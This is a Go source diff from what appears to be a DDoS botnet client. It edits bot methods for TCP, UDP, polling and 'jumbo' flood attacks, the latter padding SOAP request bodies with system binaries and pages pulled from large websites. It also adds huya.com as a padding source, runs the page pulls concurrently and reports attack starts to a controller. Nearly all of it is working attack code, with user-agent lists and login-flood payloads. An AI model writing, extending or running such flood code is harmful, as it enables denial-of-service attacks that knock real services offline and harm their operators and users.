@@ -6,7 +6,7 @@ import (
 )
 
 /*
-	GET flood Agents.
+GET flood Agents.
 */
 var httpAgents = []string{
 	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
@@ -32,7 +32,7 @@ var httpAgents = []string{
 }
 
 /*
-	POST login flood payloads.
+POST login flood payloads.
 */
 var (
 	postPayload, _ = json.Marshal(map[string]string{
@@ -47,7 +47,7 @@ var (
 )
 
 /*
-	Other payloads.
+Other payloads.
 */
 const (
 	queryPrefix  = "\xff\xff\xff\xff"
@@ -57,13 +57,14 @@ const (
 )
 
 /*
-	Increase more size of a jumbo flood.
+Increase more size of a jumbo flood.
 */
 const (
 	apple = "https://www.apple.com"
 	weibo = "https://weibo.com"
 	qq    = "https://www.qq.com"
 	ebay  = "https://www.ebay.com"
+	huya  = "https://www.huya.com/g"
 )
 
 func setAttackSwitch() {
@@ -94,7 +95,7 @@ func (b *Bot) UDP() {
 }
 
 func (b *Bot) TCP() {
-	storeOpt := strings.ToUpper(setupComd(4, "-"))
+	storeOpt := strings.ToUpper(SetupComd(4, "-"))
 	b.Report("START TCP[" + storeOpt + "] FLOOD ATTACKING: " + Recv(*BotReader, 6))
 	if setCall, setKey := SetupCaller(); setKey {
 		if value, key := TCPAttackMap[setCall.CallAttack.flags]; key {
@@ -249,19 +250,21 @@ func (b *Bot) POLING() {
 }
 
 func (b *Bot) JUMBO() {
-	b.Report("START JUMBO FLOOD ATTACK: " + Recv(*BotReader, 4))
 	if setCall, setKey := SetupCaller(); setKey {
 		/*
 			Don't forget to set a pull file,
 			incase that you add more website to pull for a jumbo flood.
 		*/
-		pullWeb(".pull_apple", apple)
-		pullWeb(".pull_weibo", weibo)
-		pullWeb(".pull_qq", qq)
-		pullWeb(".pull_ebay", ebay)
+		go pullWeb(".pull_apple", apple)
+		go pullWeb(".pull_weibo", weibo)
+		go pullWeb(".pull_qq", qq)
+		go pullWeb(".pull_ebay", ebay)
+		go pullWeb(".pull_huya", huya)
+
+		b.Report("START JUMBO FLOOD ATTACK: " + Recv(*BotReader, 4))
 		a := &Attack{
 			url:          setCall.CallAttack.url,
-			attackBody:   strings.NewReader(string("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<s:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\r\n<soap:Header>\r\n<oversize>\r\n" + meow("/usr/bin/ssh") + meow("/usr/bin/sh") + meow("/usr/bin/curl") + meow("/usr/bin/tmux") + meow(".pull_apple") + meow(".pull_weibo") + meow(".pull_qq") + meow(".pull_ebay") + "</oversize>\r\n</soap:Header>\r\n<soap:Body>\r\n</soap:Body>\r\n</soap:Envelope>")),
+			attackBody:   strings.NewReader(string("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<s:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\r\n<soap:Header>\r\n<oversize>\r\n" + meow("/usr/bin/ssh") + meow("/usr/bin/sh") + meow("/usr/bin/curl") + meow("/usr/bin/tmux") + meow(".pull_apple") + meow(".pull_weibo") + meow(".pull_qq") + meow(".pull_ebay") + meow(".pull_huya") + "</oversize>\r\n</soap:Header>\r\n<soap:Body>\r\n</soap:Body>\r\n</soap:Envelope>")),
 			attackSwitch: setCall.CallAttack.attackSwitch,
 			reportSwitch: setCall.CallAttack.reportSwitch,
 		}
